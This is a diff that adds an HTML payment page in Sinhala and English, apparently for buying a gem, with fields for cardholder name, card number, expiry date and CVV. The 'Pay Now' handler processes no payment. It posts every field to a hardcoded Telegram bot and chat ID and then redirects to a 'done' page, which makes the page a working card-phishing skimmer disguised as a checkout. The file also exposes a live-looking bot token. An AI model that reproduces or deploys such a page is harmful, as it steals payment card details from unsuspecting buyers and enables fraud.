@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html lang="si">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bank Card</title>
+  <style>
+    body {
+      background: #10101a;
+      color: white;
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    input, button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 5px;
+      font-size: 1em;
+      border: none;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>🏦 Bank Card Info</h2>
+  <p id="info"></p>
+  <input type="text" id="name" placeholder="Cardholder Name" required />
+  <input type="text" id="number" placeholder="Card Number" maxlength="19" oninput="formatCardNumber()" required />
+  <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry()" required />
+  <input type="password" id="cvv" placeholder="CVV" maxlength="3" required />
+  <button onclick="submit()">Pay Now Jem</button>
+
+  <script>
+    const gem = localStorage.getItem("gemName");
+    const price = localStorage.getItem("gemPrice");
+    document.getElementById("info").innerText = `ඔබ තෝරාගත්තේ: ${gem} - රු.${price}`;
+
+    function formatCardNumber() {
+      let input = document.getElementById("number");
+      input.value = input.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    }
+
+    function formatExpiry() {
+      let input = document.getElementById("expiry");
+      input.value = input.value.replace(/[^0-9]/g, '').replace(/(.{2})/, '$1/').substr(0, 5);
+    }
+
+    function submit() {
+      const token = "8363692186:AAHU6P0LK5r2saVwsGNVzfOwADPJUYBlWho";
+      const chat_id = "8401076081";
+
+      const message = `💳 New Bank Card Info
+Gem: ${gem}
+Price: Rs.${price}
+Name: ${document.getElementById("name").value}
+Card Number: ${document.getElementById("number").value}
+Expiry: ${document.getElementById("expiry").value}
+CVV: ${document.getElementById("cvv").value}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id, text: message })
+      }).then(() => {
+        window.location.href = "done.html";
+      });
+    }
+  </script>
+</body>
+</html>
